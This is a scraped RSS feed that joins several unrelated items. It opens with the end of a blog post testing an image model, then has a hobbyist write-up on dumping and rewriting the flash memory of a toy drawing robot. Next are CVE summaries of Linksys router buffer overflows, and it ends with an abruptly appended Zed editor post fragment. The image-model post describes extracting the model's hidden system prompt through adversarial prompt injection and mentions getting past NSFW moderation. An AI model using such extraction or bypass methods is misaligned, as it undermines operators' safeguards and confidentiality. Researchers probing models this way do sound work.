buzzword did indeed improve the composition of the output image.Many don’t know how image generating models actually encode text. In the case of the original Stable Diffusion, it used CLIP, whose text encoder open-sourced by OpenAI in 2021 which unexpectedly paved the way for modern AI image generation. It is extremely primitive relative to modern standards for transformer-based text encoding, and only has a context limit of 77 tokens: a couple sentences, which is sufficient for the image captions it was trained on but not nuanced input. Some modern image generators use T5, an even older experimental text encoder released by Google that supports 512 tokens. Although modern image models can compensate for the age of these text encoders through robust data annotation during training the underlying image models, the text encoders cannot compensate for highly nuanced text inputs that fall outside the domain of general image captions.A marquee feature of Gemini 2.5 Flash is its support for agentic coding pipelines; to accomplish this, the model must be trained on extensive amounts of Markdown (which define code repository s and agentic behaviors in ) and JSON (which is used for structured output/function calling/MCP routing). Additionally, Gemini 2.5 Flash was also explictly trained to understand objects within images, giving it the ability to create nuanced segmentation masks. Nano Banana’s multimodal encoder, as an extension of Gemini 2.5 Flash, should in theory be able to leverage these properties to handle prompts beyond the typical image-caption-esque prompts. That’s not to mention the vast annotated image training datasets Google owns as a byproduct of Google Images and likely trained Nano Banana upon, which should allow it to semantically differentiate between an image that is  and one that isn’t, as with similar buzzwords.Let’s give Nano Banana a relatively large and complex prompt, drawing from the learnings above and see how well it adheres to the nuanced rules specified by the prompt:This prompt has : specific composition and descriptions of different entities, the use of hex colors instead of a natural language color, a heterochromia constraint which requires the model to deduce the colors of each corresponding kitten’s eye from earlier in the prompt, and a typo of “San Francisco” that is definitely intentional.Each and every rule specified is followed.For comparison, I gave the same command to ChatGPT—which in theory has similar text encoding advantages as Nano Banana—and the results are worse both compositionally and aesthetically, with more tells of AI generation. The yellow hue certainly makes the quality differential more noticeable. Additionally, no negative space is utilized, and only the middle cat has heterochromia but with the incorrect colors.Another thing about the text encoder is how the model generated unique relevant text in the image without being given the text within the prompt itself: we should test this further. If the base text encoder is indeed trained for agentic purposes, it should at-minimum be able to generate an image of code. Let’s say we want to generate an image of a minimal recursive Fibonacci sequence in Python, which would look something like:I gave Nano Banana this prompt:It  to generate the correct corresponding code but the syntax highlighting/indentation didn’t quite work, so I’ll give it a pass. Nano Banana is definitely generating code, and was able to maintain the other compositional requirements.For posterity, I gave the same prompt to ChatGPT:It did a similar attempt at the code which indicates that code generation is indeed a fun quirk of multimodal autoregressive models. I don’t think I need to comment on the quality difference between the two images.An alternate explanation for text-in-image generation in Nano Banana would be the presence of prompt augmentation or a prompt rewriter, both of which are used to orient a prompt to generate more aligned images. Tampering with the user prompt is common with image generation APIs and aren’t an issue unless used poorly (which caused a PR debacle for Gemini last year), but it can be very annoying for testing. One way to verify if it’s present is to use adversarial prompt injection to get the model to output the prompt itself, e.g. if the prompt is being rewritten, asking it to generate the text “before” the prompt should get it to output the original prompt.That’s, uh, not the original prompt. Did I just leak Nano Banana’s system prompt completely by accident? The image is hard to read, but if it  the system prompt—the use of section headers implies it’s formatted in Markdown—then I can surgically extract parts of it to see just how the model ticks:These seem to track, but I want to learn more about those buzzwords in point #3:Huh, there’s a guard specifically against buzzwords? That seems unnecessary: my guess is that this rule is a hack intended to avoid the perception of model collapse by avoiding the generation of 2022-era AI images which would be annotated with those buzzwords.As an aside, you may have noticed the ALL CAPS text in this section, along with a YOU WILL BE PENALIZED FOR USING THEM command. There is a reason I have been sporadically capitalizing  in previous prompts: caps does indeed work to ensure better adherence to the prompt (both for text and image generation),  and threats do tend to improve adherence. Some have called it sociopathic, but this generation is proof that this brand of sociopathy is approved by Google’s top AI engineers.Tangent aside, since “previous” text didn’t reveal the prompt, we should check the “current” text:That worked with one peculiar problem: the text “image” is flat-out missing, which raises further questions. Is “image” parsed as a special token? Maybe prompting “generate an image” to a generative image AI is a mistake.I tried the last logical prompt in the sequence:…which always raises a  error: not surprising if there is no text after the original prompt.This section turned out unexpectedly long, but it’s enough to conclude that Nano Banana definitely has indications of benefitting from being trained on more than just image captions. Some aspects of Nano Banana’s system prompt imply the presence of a prompt rewriter, but if there is indeed a rewriter, I am skeptical it is triggering in this scenario, which implies that Nano Banana’s text generation is indeed linked to its strong base text encoder. But just how large and complex can we make these prompts and have Nano Banana adhere to them?Image Prompting Like an Engineer#Nano Banana supports a context window of 32,768 tokens: orders of magnitude above T5’s 512 tokens and CLIP’s 77 tokens. The intent of this large context window for Nano Banana is for multiturn conversations in Gemini where you can chat back-and-forth with the LLM on image edits. Given Nano Banana’s prompt adherence on small complex prompts, how well does the model handle larger-but-still-complex prompts?Can Nano Banana render a webpage accurately? I used a LLM to generate a bespoke single-page HTML file representing a Counter app, available here.The web page uses only vanilla HTML, CSS, and JavaScript, meaning that Nano Banana would need to figure out how they all relate in order to render the web page correctly. For example, the web page uses CSS Flexbox to set the ratio of the sidebar to the body in a 1/3 and 2/3 ratio respectively. Feeding this prompt to Nano Banana:That’s honestly better than expected, and the prompt cost 916 tokens. It got the overall layout and colors correct: the issues are more in the text typography, leaked classes/styles/JavaScript variables, and the sidebar:body ratio. No, there’s no practical use for having a generative AI render a webpage, but it’s a fun demo.A similar approach that  have a practical use is providing structured, extremely granular descriptions of objects for Nano Banana to render. What if we provided Nano Banana a JSON description of a person with extremely specific details, such as hair volume, fingernail length, and calf size? As with prompt buzzwords, JSON prompting AI models is a very controversial topic since images are not typically captioned with JSON, but there’s only one way to find out. I wrote a prompt augmentation pipeline of my own that takes in a user-input description of a quirky human character, e.g. generate a male Mage who is 30-years old and likes playing electric guitar, and outputs a very long and detailed JSON object representing that character with a strong emphasis on unique character design.  But generating a Mage is boring, so I asked my script to generate a male character that is an equal combination of a Paladin, a Pirate, and a Starbucks Barista: the resulting JSON is here.The prompt I gave to Nano Banana to generate a photorealistic character was:Beforehand I admit I didn’t know what a Paladin/Pirate/Starbucks Barista would look like, but he is definitely a Paladin/Pirate/Starbucks Barista. Let’s compare against the input JSON, taking elements from all areas of the JSON object (about 2600 tokens total) to see how well Nano Banana parsed it:A tailored, fitted doublet made of emerald green Italian silk, overlaid with premium, polished chrome shoulderplates featuring embossed mermaid logos, check.A large, gold-plated breastplate resembling stylized latte art, secured by black leather straps, check.Highly polished, knee-high black leather boots with ornate silver buckles, check.right hand resting on the hilt of his ornate cutlass, while his left hand holds the golden espresso tamper aloft, catching the light, mostly check. (the hands are transposed and the cutlass disappears)Checking the JSON field-by-field, the generation also fits most of the smaller details noted.However, he is not photorealistic, which is what I was going for. One curious behavior I found is that any approach of generating an image of a high fantasy character in this manner has a very high probability of resulting in a digital illustration, even after changing the target publication and adding “do not generate a digital illustration” to the prompt. The solution requires a more clever approach to prompt engineering: add phrases and compositional constraints that imply a heavy physicality to the image, such that a digital illustration would have more difficulty satisfying all of the specified conditions than a photorealistic generation:The image style is definitely closer to Vanity Fair (the photographer is reflected in his breastplate!), and most of the attributes in the previous illustration also apply—the hands/cutlass issue is also fixed. Several elements such as the shoulderplates are different, but not in a manner that contradicts the JSON field descriptions: perhaps that’s a sign that these JSON fields can be prompt engineered to be even  nuanced.Yes, prompting image generation models with HTML and JSON is silly, but “it’s not silly if it works” describes most of modern AI engineering.The Problems with Nano Banana#Nano Banana allows for very strong generation control, but there are several issues. Let’s go back to the original example that made ChatGPT’s image generation go viral: Make me into Studio Ghibli. I ran that exact prompt through Nano Banana on a mirror selfie of myself:…I’m not giving Nano Banana a pass this time.Surprisingly, Nano Banana is terrible at style transfer even with prompt engineering shenanigans, which is not the case with any other modern image editing model. I suspect that the autoregressive properties that allow Nano Banana’s excellent text editing make it too resistant to changing styles. That said, creating a new image in the style of Studio Ghibli does in fact work as expected, and creating a new image using the character provided in the input image with the specified style (as opposed to a style ) has occasional success.Speaking of that, Nano Banana has essentially no restrictions on intellectual property as the examples throughout this blog post have made evident. Not only will it not refuse to generate images from popular IP like ChatGPT now does, you can have many different IPs in a single image.Normally, Optimus Prime is the designated driver.I am not a lawyer so I cannot litigate the legalities of training/generating IP in this manner or whether intentionally specifying an IP in a prompt but also stating “do not include any watermarks” is a legal issue: my only goal is to demonstrate what is currently possible with Nano Banana. I suspect that if precedent is set from existing IP lawsuits against OpenAI and Midjourney, Google will be in line to be sued.Another note is moderation of generated images, particularly around NSFW content, which always important to check if your application uses untrusted user input. As with most image generation APIs, moderation is done against both the text prompt and the raw generated image. That said, while running my standard test suite for new image generation models, I found that Nano Banana is surprisingly one of the more lenient AI APIs. With some deliberate prompts, I can confirm that it is possible to generate NSFW images through Nano Banana—obviously I cannot provide examples.I’ve spent a very large amount of time overall with Nano Banana and although it has a lot of promise, some may ask why I am writing about how to use it to create highly-specific high-quality images during a time where generative AI has threatened creative jobs. The reason is that information asymmetry between what generative image AI can and can’t do has only grown in recent months: many still think that ChatGPT is the only way to generate images and that all AI-generated images are wavy AI slop with a piss yellow filter. The only way to counter this perception is though evidence and reproducibility. That is why not only am I releasing Jupyter Notebooks detailing the image generation pipeline for each image in this blog post, but why I also included the prompts in this blog post proper; I apologize that it padded the length of the post to 26 minutes, but it’s important to show that these image generations are as advertised and not the result of AI boosterism. You can copy these prompts and paste them into AI Studio and get similar results, or even hack and iterate on them to find new things. Most of the prompting techniques in this blog post are already well-known by AI engineers far more skilled than myself, and turning a blind eye won’t stop people from using generative image AI in this manner.I didn’t go into this blog post expecting it to be a journey, but sometimes the unexpected journeys are the best journeys. There are  cool tricks with Nano Banana I cut from this blog post due to length, such as providing an image to specify character positions and also investigations of styles such as pixel art that most image generation models struggle with, but Nano Banana now nails. These prompt engineering shenanigans are only the tip of the iceberg.]]></content:encoded></item><item><title>Drawbot: Let’s Hack Something Cute!</title><link>https://www.atredis.com/blog/2025/9/30/drawbot-lets-hack-something-cute</link><author>Jessie Chab</author><category>vulns</category><pubDate>Thu, 13 Nov 2025 17:25:14 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[# Drawbot: Let’s Hack Something Cute!

## The Target

A few months ago I realized I was overdue for a fun, quirky hardware project. Every so often I like to see what new and interesting electronic children's toys are out there. When looking, I keep in mind the potential attack surface, typically preferring toys with companion mobile apps, wireless communications, or any other added complexity.

I came across these robots that draw from a set of pre-defined images. They all come with a pack of 100 or 150 cards, and the drawings appear very similar across brands. The attack surface seemed especially small, given that it uses pre-defined physical cards, so I wouldn't be able to snoop an FCC ID for this one and peek its sweet sweet innards (I consider those spoilers anyway). Regardless, it seemed like an interesting target and I couldn't resist.

I picked this one because it had the best face. The wording/typos on the box were definitely a good sign that there was some quirkiness afoot. It came with a stack of 100 cards, each with a very minimal "barcode" consisting of 8 bits of information, meaning 256 possible barcodes/drawings. The cards were separated into five categories: food, animal, plant, vehicle, and circle (obviously). I loaded up the “bulbous cactus” card and sent it on its way. It talked. It sang. It’s perfect.

Let us commence the evisceration.

## Tearing it Down

If I'm being honest, this is my favorite part.

On the bottom we have a few ultra-recessed screw-holes. You'd think at this point I'd be properly equipped to deal with these, but I'm not. Without fail, every hardware assesment helps me realize what I still don't have (besides patience). No matter how many specialized tools or components I amass in my home lab, there's always something that I end up having to buy. At this point I could have easily purchased what I needed for same or next-day delivery, but that would require patience. I could have probably 3D printed something to do the job. Again, I'm not that patient.

What I lack in patience I make up for in power tools. I ended up using a combination of, well, drilling the hole slightly bigger to clear some of my screwdriver bits, and chaining bits together.

With the four recessed screws removed, the top half popped off without much additional trouble.

With the barcode reader exposed, I tried some very basic preliminary fuzzing by taking a valid card and shifting it around to provide unexpected input. When a card is placed over the sensors, the device makes a sound and then announces the associated image.

While fuzzing, various images were announced, all of which seemed to match up with other cards I had seen in the deck, until the robot announced "Take a bath!" This seemed odd (and mildly offensive), so I rummaged through the deck and could not for the life of me find any cards with bath imagery.

With the card held in place, I pushed the button to initiate drawing. The robot started singing and, surely enough, drew this image:

## Goals

Now that I had a decent idea what I was working with, I set the following two goals for myself:

1. Enumerate and identify all available drawings. The cards clearly don’t tell the whole story here.

2. The classic goal at Atredis: Put a Bird on It™ (i.e. figure out how these drawings are represented and stored, and use this information to add our own).


## Components

My next step was to identify the components on the board and see what I could gather/dump. The three juicy ones are labelled below.

- LKS32MC07x - ARM Cortex-M0 MCU

- uc25IQ64 - 64MB SPI NOR flash

- uc25IQ128A - 128MB SPI NOR flash


I was able to dump the 64MB flash via its SPI interface, had no luck with the 128MB flash, and also had no luck connecting to the MCU via SWD. Not a great start, but i was undeterred.

## Barcode Analysis

Using a multimeter and the printed trace lines, we can map the connections for the optical sensors that read the barcode to determine which card is inserted.

I was initially stumped by the fact that there was some overlap between the sensors and the pins. In my research, I came upon the concept of input multiplexing. Essentially, the board will power sensors 1-5 using VCC 1, then read the values on the input pins. Then it powers sensors 6-8 using VCC 2, and reuses the same input pins to read those values.

To test this theory, I decided to hook a logic analyzer up to the various inputs. To keep myself sane, I replaced the original all-red-wired connector with two sets of color-coded custom ones broken out to a breadboard with two rows of headers between them. This setup would facilitate both passive analysis and active signal manipulation simultaneously.

Sure enough, the VCC lines alternated at a regular cadence, lending massive credibility to the multiplexing theory.

With everything connected to the Saleae, I could now observe the behavior when a card was scanned. I chose the card corresponding to barcode value 00000001 to hopefully make the data more obvious to recognize. With the crab card in place, I would expect the rightmost sensor to register the HIGH value, while the others would register LOW. Well, as you can see below, the orientation of the barcode is swapped on the backside, so in reality the leftmost sensor is registering the HIGH value. I wish I could say I noticed this right away. I really wish I could say that.

Once I figured that out, the data matched up with our expectations. During the VCC1 phase, sensors 1-5 are powered and the pins are read. Sensor 1 (leftmost) is our sole HIGH (1) in this case; sensors 2 through 5 are LOW (0). Then in VCC2 phase, sensors 6-8 are powered and the pins are once more read; the corresponding values make up the final 3 bits of our barcode, for a final value of 00000001. I have the VCC triggers shown in reverse order below (i.e. VCC2 before VCC1) to make the barcode value more clear, but this process repeats several times with consistent values, so the ordering is not relevant.

In hardware analysis, these are the moments I live for. The way I outline it here, It seems so straightforward and obvious (if I did my job correctly), but for me, the path here was sprinkled with failures, confusion, wiring mistakes, and several consultations with my coworker Chad(GPT).

Anyway let’s test this out with a more complex barcode. The hot dog card has a barcode value of 01000111.

## Barcode Emulation

Now that we understand how barcodes are translated into signals, we can emulate them using a programmable form of input. I opted to use a Raspberry Pi, as it can operate at 3.3V and seemed perfect for this use case.

First, we need to map each relevant pin on the sensor board to a GPIO pin on the pi. I'm using red to represent the VCC lines, but as you can see, they're actually mapped to GPIO pins here. Since we don't actually need to power a board, we're using these lines as input, so we can track the power cycles and know which sets of “sensors" are being read, and which barcode bits they correspond to.

With everything wired, the next step is to script up the logic to loop through the decimal values 1 through 256, convert to binary, chunk that binary up into two groups, and write the appropriate values to the GPIO pins based on which phase of the VCC multiplexing cycle we’re in.

```
import gpiod import time chip = gpiod.Chip("gpiochip0") #inputs: # VCC1 (GPIO23) # VCC2 (GPIO5) vcc1 = chip.get_line(23) vcc2 = chip.get_line(5) vcc1.request(consumer="vcc1", type=gpiod.LINE_REQ_DIR_IN) vcc2.request(consumer="vcc2", type=gpiod.LINE_REQ_DIR_IN) #outputs: # D1/6 (GPIO2) # D2/7 (GPIO3) # D3/8 (GPIO4) # D4 (GPIO17) # D5 (GPIO27) outputs = chip.get_lines([2, 3, 4, 17, 27]) outputs.request(consumer="barcode", type=gpiod.LINE_REQ_DIR_OUT) try: for bcode in range(1, 256): #convert to 8-bit binary string, then list of bits bits = [int(b) for b in format(bcode, '08b')] print(f"{bcode} ({bits})") #split into two groups from the right with order reversed (i.e. LSB first) #e.g. 204 ([1,1,0,0,1,1,0,0]) -> [0,0,1,1,0] & [0,1,1] group1 = bits[-5:][::-1] group2 = bits[:-5][::-1] last_vcc1 = 0 last_vcc2 = 0 start = time.time() while time.time() - start < 4: #let each barcode "sit" for 4 seconds v1 = vcc1.get_value() v2 = vcc2.get_value() #on VCC1 rising edge -> emit group1 if v1 == 1 and last_vcc1 == 0: out = group1 outputs.set_values(out) time.sleep(0.02) outputs.set_values([1, 1, 1, 1, 1]) #on VCC2 rising edge -> emit group2 on D1–D3, hold D4–5 HIGH if v2 == 1 and last_vcc2 == 0: out = group2 + [1, 1] outputs.set_values(out) time.sleep(0.02) outputs.set_values([1, 1, 1, 1, 1]) last_vcc1 = v1 last_vcc2 = v2 outputs.set_values([1, 1, 1, 1, 1]) time.sleep(2) except KeyboardInterrupt: outputs.set_values([1, 1, 1, 1, 1]) outputs.release() vcc1.release() vcc2.release()
```

It took a ton of trial and error, tweaking, logic analysis, wire rechecks, and cursing to get to this point.

While looping through every possible image, I painstakingly wrote down what I heard. In some cases, I really could not decipher the audio. In those cases, I would need to have the robot actually draw the image and hope it made sense.

With this “lookup” file, I modified the script to also print out the text along with the numeric value. Now I could pinpoint the oddballs and draw them, like the example below where I heard “chain block.”

```
$ python3 all-barcodes.py 218 ([1, 1, 0, 1, 1, 0, 1, 0]) 218: chain block?
```

Cool yes, seems plausible.

With this approach, I filled in some of the gaps and identified some of the “hidden” images that weren’t represented by the included cards.

The full set of available images can be seen below. The stack of cards provided with the robot include images 1 through 100. Everything beyond that is a mysterious hidden bonus.

With my first goal achieved, it was time to move on to potentially getting this thing to draw arbitrary images.

## Drawing Analysis

To be able to draw our own images, we need to understand how images are represented, where they’re stored, and whether we have the ability to overwrite these values. When I first opened this thing up, I was only able to dump the smaller of the two flash chips, so I had to hope this is where the images files lived or figure out how to dump the larger chip as well.

Going back to my initial flash dump, the hex output looked to contain a directory entry layout with some numeric filenames, which seemed promising.

```
$ xxd UC25IQ64.bin | head -n 20 00000000: 1972 81a6 2000 0000 80b0 5600 03ff 0000 .r.. .....V..... 00000010: 7465 7374 5f64 6972 00ff ffff ffff ffff test_dir........ 00000020: 42ae 43d2 2045 0000 ac0f 0000 02ff 0000 B.C.

```

A typical directory entry layout looks a bit like the following:

```
Directory entry layout (32 bytes total) 0x00 0x04 0x08 0x0C 0x10 0x20 ┌───────────────┬──────────────┬─────────────┬─────────────┬──────────────────────────┐ │ CRC / checksum│ START offset │ SIZE │ FLAGS │ NAME (ASCII, 16 bytes) │ │ (uint32 LE) │ (uint32 LE) │ (uint32 LE) │ (uint32 LE) │ null-terminated │ └───────────────┴──────────────┴─────────────┴─────────────┴──────────────────────────┘
```

For example, the directory entry for `001.fla` has the following content breakdown:

Knowing this, we can semi-shamefully vibe code a High Level Analyzer (HLA) in Logic to identify all SPI `flash_read` operations, take the associated read address from the `fast_read`, perform a lookup against our directory entry layout, and print the associated filename to show what is being read at that moment.

With the HLA in place, I had the bot read and draw image number 105. Sure enough, it read the file `Y105.f1a`. However, it read several other files during the course of drawing, including `TE05luo2.f1a`, `TXXm5.f1b`, and `TE08stop.f1a`. When I scanned other cards, the associated `YXXX.f1a` file was read, even if I never drew the image. The pattern of these other reads seemed to line up with whenever the robot would talk or sing. This led me to believe that I was actually looking at the audio files, not the drawings.

It was time to go after that second SPI flash chip again. Fortunately I learned from my trusted colleague Chris Bellows that, when in doubt, go for the chip-off extraction. This was successful and a good time was had by all.

```

[...] Found Unknown flash chip "SFDP-capable chip" (2048 kB, SPI) on buspirate_spi. === This flash part has status UNTESTED for operations: WP [...] Reading flash... done.
```

Side note - with this SPI flash chip removed from the board, the drawbot still functioned. It would power on, read and announce cards, and play music. The one thing it did NOT do was actually move its arms and draw the images, which seemed like pretty intense proof that this chip contained the drawing files and the smaller flash chip contained the audio.

The contents of the extracted image looked very structured, which boded well for being some sort of coordinate-based data that one would expect for a drawing.

Because it's the year 2025 and LLMs are coming for our jobs anyway, I thought I would give ChatGPT a chance to make short work of my analysis. I fed it the dump, said I suspected that it contained image instruction files, and sent it on its way.

Putting aside the excessive flattery and overall semi-off-putting vibe of my ChatGPT, we’ve got it!

Only problem is, there appear to be only 35 images within the file. The first 35 images to be exact. Since this is an atypical chip, it's possible that flashrom is making incorrect assumptions. We know from the spec that we should have 16MB of data, so we can force it to read 16MB by specifying a target chip similar enough to ours. I've done several extractions of Winbond flash, so that’s what I went with, and the new dump contained 254 images.

Since we now know the structure, we can script up a parser/generator in Python that will carve out the data for each image, process the coordinates, and feed them into SVG path elements to create an image file. An excerpt of this script can be seen here:

```
def write_svg(strokes, out: Path, flip_y=True, stroke_w=2): bb = bbox(strokes) if not bb: return False xmin, ymin, xmax, ymax = bb w, h = xmax - xmin + 1, ymax - ymin + 1 with out.open("w", encoding="utf-8") as f: if flip_y: f.write(f'\n') f.write(f' \n\n') else: f.write(f'\n') for s in strokes: f.write(' \n'.format( s[0][0], s[0][1], " ".join(f"L{x},{y}" for x, y in s[1:]))) f.write('\n') return True def main(): ap = argparse.ArgumentParser(description="Extract SVGs from fixed slots") ap.add_argument("bin", type=Path, help="full flash dump (e.g., full.bin)") ap.add_argument("--out", type=Path, default=Path("svgs"), help="output directory") ap.add_argument("--base", type=lambda x:int(x,0), default=0x04, help="first slot start offset (default 0x04)") ap.add_argument("--slot", type=lambda x:int(x,0), default=0xEA60, help="slot size (default 0xEA60)") ap.add_argument("--count", type=int, default=None, help="number of slots (default: autodetect from file size)") ap.add_argument("--min-pts", type=int, default=2, help="min points to export (default 2)") ap.add_argument("--no-flip-y", action="store_true", help="do not flip Y axis") args = ap.parse_args() data = args.bin.read_bytes() size = len(data) if args.count is None: # Best-effort autodetect usable = max(0, size - args.base) args.count = usable // args.slot args.out.mkdir(parents=True, exist_ok=True) exported = 0 for i in range(args.count): off = args.base + i * args.slot if off >= size: break slot = data[off : min(off + args.slot, size)] words = u16be_words(slot) strokes = strokes_from_slot(words) if sum(len(s) for s in strokes) < args.min_pts: continue svg_path = args.out / f"drawing_{i:03d}.svg" if write_svg(strokes, svg_path, flip_y=not args.no_flip_y, stroke_w=2): exported += 1 # uncomment for debug: # print(f"{i:03d} @ 0x{off:08X} -> {svg_path.name}") print(f"Exported {exported} SVGs to {args.out} from {args.count} slots " f"(base=0x{args.base:X}, slot=0x{args.slot:X}).")
```

Because this was written by an LLM, it is a bit.. _extra_. It could likely be simplified, but in its current state, it lets you specify the slot offset where you’d like to start extracting images, the number of sequential images to extract, the minimum number of points it must detect before it considers an entry a valid image, and the ability to flip the image when rendering (since it draws from the top, it actually stores the images upside-down).

```
> python3 img_carver.py ../dumps/UC25IQ128_forced.bin --no-flip-y --out svgs Exported 254 SVGs to svgs from 279 slots (base=0x4, slot=0xEA60).
```

Well this would have been a more straightforward way to view all possible images without enumerating and spoofing them, but hey, there are many ways to skin a cat and I’d like to learn them all. There are a lot of cats in this world that need skinning.

Now that we can go from raw data -> SVG, we want to go in the other direction to get this thing to draw an image of our choosing. There are a lot of tools out there to convert a PNG to an SVG, and below you can see why the latter is much more suited to our needs. SVGs are scalable because they contain path data that can be easily transformed with the power of maths.

With our target image, we just need to parse through the path data and transform it into the data format that drawbot expects. Since the flash memory is just one big blob and we’re hoping to only overwrite one image (i.e. the other drawings will still work), we need to make sure our padding is correct and that we follow the expected format, including any necessary delimiters. As we could see from the crab drawing ChatGPT spit out, it didn’t quite seem to process the “pen up” actions properly, so every movement drew a line. Luckily for me, my drawing is a single continuous line, so I don’t have to worry about that quite yet.

Here’s an excerpt of my final script. It takes an existing slot, determines the bounding box, fits the new SVG into the coordinate plane’s bounding box, then creates a new slot that’s the same size as the one to be replaced.

```
def main(): ap = argparse.ArgumentParser(description="Fit an SVG to a slot's bbox and pack to device format") ap.add_argument("slot_content", type=Path, help="existing slot content (0xEA5C bytes; starts at first X)") ap.add_argument("svg", type=Path, help="SVG to insert") ap.add_argument("--out", type=Path, default=Path("slot_new_content.bin"), help="output content-only bin (0xEA5C)") ap.add_argument("--out-with-marker", type=Path, help="also write a 0xEA60 file with trailing FFFF FFFF") ap.add_argument("--step", type=float, default=4.0, help="sampling step in SVG units (bigger = fewer points)") ap.add_argument("--margin", type=float, default=0.0, help="margin in device units inside target bbox (default 0)") ap.add_argument("--flip-y", action="store_true", help="flip Y if your preview is upside-down") args = ap.parse_args() slot_bytes = args.slot_content.read_bytes() if len(slot_bytes) != CONTENT_LEN and len(slot_bytes) != SLOT_LEN: print(f"[warn] slot_content length is {len(slot_bytes)}; expected 0xEA5C or 0xEA60. Continuing...") # Derive target bbox from existing slot content (robust to trailing marker) bb = parse_bbox_from_slot_content(slot_bytes[:CONTENT_LEN]) print(f"[info] target bbox (from slot): x[{bb[0]}..{bb[2]}], y[{bb[1]}..{bb[3]}]") # Load & sample SVG paths, _, svg_attr = svg2paths2(str(args.svg)) vb = get_svg_viewbox(paths, svg_attr) # Build strokes list (each continuous subpath = one stroke) strokes: List[List[Point]] = [] for p in paths: for sub in p.continuous_subpaths(): strokes.append(sample_path(sub, args.step)) qstrokes = quantize_to_bbox(strokes, vb, bb, margin=args.margin, flip_y=args.flip_y) payload = pack_content(qstrokes, CONTENT_LEN) args.out.write_bytes(payload) print(f"[done] wrote {args.out} ({len(payload)} bytes).”) […]
```

```
$ python3 svg_fit_to_slot.py slot_006_content.bin ../images/whisky-outline.svg --out slot_006_new_content_03.bin --step 6.0 --margin 4 [info] target bbox (from slot): x[56..1124], y[176..1005] [done] wrote slot_006_new_content.bin (59996 bytes).

[…]
```

Now that we’ve overwritten a single slot, we need to write it back into the original image.

```
$ dd if=slot_006_new_content_03.bin of=UC25IQ128_trunc_mod.bin bs=1 seek=$((0x000493E4)) conv=notrunc 59996+0 records in 59996+0 records out 59996 bytes transferred in 0.120694 secs (497092 bytes/sec)
```

I _should_ have confirmed that we could write to the flash chip before even going down this path. Fortunately, we could.

```
$ sudo flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=250k -f -w UC25IQ128_trunc_mod.bin -VV flashrom unknown on Linux 6.8.0-60-generic (aarch64) flashrom is free software, get the source code at https://flashrom.org Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). flashrom was built with GCC 13.2.0, little endian […] Found Unknown flash chip "SFDP-capable chip" (2048 kB, SPI). === This flash part has status UNTESTED for operations: WP … Block protection is disabled. Reading old flash chip contents... done. Erasing and writing flash chip... Trying erase function 0… Erase/write done. Verifying flash... VERIFIED. Raw bitbang mode version 1 Bus Pirate shutdown completed.
```

It was at this point that I remembered that the chip wasn’t actually installed into the drawbot anymore. Since nothing ever works on the first try, this was very likely a problem. I already had it installed on this nice breakout board with headers, so I soldered wires to the board itself, globbed on hot glue to try and keep them from ripping off of the board, and hooked them up to connectors on the other side. This way, I could switch back and forth between my programmer and the drawbot until it was just right.

It took a few iterations where I had to work out some minor kinks, but it actually worked. I couldn’t have some gnarled headless robot in my final demo, so I modified the the case to accommodate its flash chip hanging out and patched it back up as best I could.

If you’d like to watch the whole video, you’ll get to hear one of the many drawbot songs that have been stuck in my head during the course of this project.

A potential area of future work would be streamlining this process to facilitate passing an image to a script that would handle conversion, writing to flash, and triggering the drawing (more GPIO manipulation with the pi) all at once. It would also be fun to figure out the audio format to replace the various songs and sounds (I did spend a little time attempting to decode and play them using ffmpeg). I also considered overhauling the drawbot entirely, designing and 3d-printing a new body.

It’s entirely possible that I’ll come back and try one or all of these things in the future. If I do and anything comes of it, I’ll be sure to let you know.

What’s more likely is that I’ll find a new target to respectfully butcher and reanimate. Will keep you posted either way.

Happy hacking!]]></content:encoded></item><item><title>CVE-2025-60691 - Linksys E1200 HTTPd Remote Code Execution Buffer Overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-60691</link><author></author><category>vulns</category><pubDate>Thu, 13 Nov 2025 17:15:49 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-60691

A stack-based buffer overflow exists in the httpd binary of Linksys E1200 v2 routers (Firmware E1200_v2.0.11.001_us.tar.gz). The apply_cgi and block_cgi functions copy user-supplied input from the "url" CGI parameter into stack buffers (v36, v29) using sprintf without bounds checking. Because these buffers are allocated as single-byte variables, any non-empty input will trigger a buffer overflow. Remote attackers can exploit this vulnerability via crafted HTTP requests to execute arbitrary code or cause denial of service without authentication.

A stack-based buffer overflow vulnerability exists in the libshared.so library of Cisco Linksys E1200 v2 routers (Firmware E1200_v2.0.11.001_us.tar.gz). The functions get_mac_from_ip and get_ip_from_mac use sscanf with overly permissive "%100s" format specifiers to parse entries from /proc/net/arp into fixed-size buffers (v6: 50 bytes, v7 sub-arrays: 50 bytes). This allows local attackers controlling the contents of /proc/net/arp to overflow stack buffers, leading to memory corruption, denial of service, or potential arbitrary code execution.

A stack-based buffer overflow vulnerability exists in the makeRequest.cgi binary of Linksys RE7000 routers (Firmware FW_v2.0.15_211230_1012). The arplookup function parses lines from /proc/net/arp using sscanf("%16s ... %18s ..."), storing results into buffers v6 (12 bytes) and v7 (20 bytes). Since the format specifiers allow up to 16 and 18 bytes respectively, oversized input can overflow the buffers, resulting in stack corruption. Local attackers controlling /proc/net/arp contents can exploit this issue to cause denial of service or potentially execute arbitrary code.

Some teammates jot down their schedule deviations, while others detail what they intend to focus on for the week.
Nathan just wrapped up top-of-mind announcements and Morgan is sharing trends from our metrics and covering operational updates.
Meanwhile I'm preparing user quotes from the last week to share out, and others add topics to the  section.Throughout the meeting, screens are being shared, various voices are popping in and out of the conversation, and our notes are growing rapidly as dozens of cursors are concurrently editing the same file in real-time.This entire meeting is taking place inside Zed.Our mission from the beginning has been to engineer an editor that will be:: The latency between keystroke and re-render should be imperceptible.: The interface should offer minimal distractions and stay out of the code's way.: Working with teammates should feel no different than sitting next to them in the office.Setting the first two properties aside, let's focus on collaboration.But wait... doesn't this technology already exist in other editors?Yes!
If you've been a developer long enough, you might recall the teletype package for Atom—both built by Zed's founders.
Teletype enabled developers to share "portals" into their workspaces, which was an initial step towards Zed's collaborative vision.
Despite attempts to make Atom—an Electron application—more responsive, it never reached the performance standards the team yearned for.
Nathan left the Atom team and eventually began work on gpui, Zed's GPU-accelerated UI rendering framework, written in Rust, and Atom would later be sunset by GitHub after.
No more Atom, no more Teletype.Other editors have added their versions of collaboration, but the landscape still falls short.
Setup is just tedious enough to be a hassle; you often have to install extensions, and paste links into a terminal or editor every time you want to share.
